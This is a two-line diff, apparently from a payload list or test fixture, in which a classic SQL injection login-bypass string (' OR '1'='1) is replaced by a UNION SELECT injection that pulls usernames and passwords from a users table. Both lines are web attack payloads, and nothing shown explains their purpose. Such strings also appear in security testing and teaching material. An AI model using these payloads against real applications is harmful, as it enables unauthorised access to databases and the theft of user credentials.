@@ -1,1 +1,1 @@
-\' OR '1'='1
+UNION SELECT username, password FROM users-- 
